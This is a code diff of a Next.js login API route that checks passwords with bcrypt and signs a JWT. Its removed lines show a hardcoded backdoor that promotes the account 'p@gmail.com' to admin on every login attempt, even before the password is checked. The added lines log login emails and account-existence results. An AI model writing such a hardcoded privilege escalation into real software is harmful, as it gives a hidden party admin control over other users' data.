@@ -13,40 +13,29 @@ export async function POST(req: NextRequest) {
         console.log('Database connected.');
 
         const { email, password } = await req.json();
-        console.log('Login for:', email);
+        console.log('Login attempt for:', email);
 
+        console.log('Searching for user in DB...');
         const user = await User.findOne({ email });
-        console.log('User search completed.');
+        console.log('User found:', user ? 'Yes' : 'No');
 
         if (!user) {
-            console.log('User not found.');
-            return NextResponse.json({ message: 'Invalid credentials' }, { status: 400 });
+            console.log('User not found in database.');
+            return NextResponse.json({ message: 'Invalid email or password' }, { status: 400 });
         }
 
-
-        if (email === 'p@gmail.com' && user.role !== 'admin') {
-            console.log('Promoting p@gmail.com to admin...');
-            user.role = 'admin';
-            await user.save();
-        }
-
-        console.log('Comparing passwords...');
-        const isMatch = await Promise.race([
-            bcrypt.compare(password, user.password),
-            new Promise<boolean>((_, reject) => setTimeout(() => reject(new Error('Password comparison timeout')), 5000))
-        ]);
-        console.log('Password comparison check completed. Match:', isMatch);
+        console.log('Comparing passwords with bcrypt...');
+        const isMatch = await bcrypt.compare(password, user.password);
+        console.log('Password match:', isMatch);
 
         if (!isMatch) {
-            return NextResponse.json({ message: 'Invalid credentials' }, { status: 400 });
+            console.log('Password does not match.');
+            return NextResponse.json({ message: 'Invalid email or password' }, { status: 400 });
         }
 
-        console.log('Signing token...');
-        const token = await Promise.race([
-            signToken({ id: user._id.toString(), email: user.email, role: user.role }),
-            new Promise<string>((_, reject) => setTimeout(() => reject(new Error('Token signing timeout')), 5000))
-        ]);
-        console.log('Token signed.');
+        console.log('Generating JWT token...');
+        const token = await signToken({ id: user._id.toString(), email: user.email, role: user.role });
+        console.log('Token generated successfully.');
 
         const response = NextResponse.json({
             message: 'Logged in successfully',
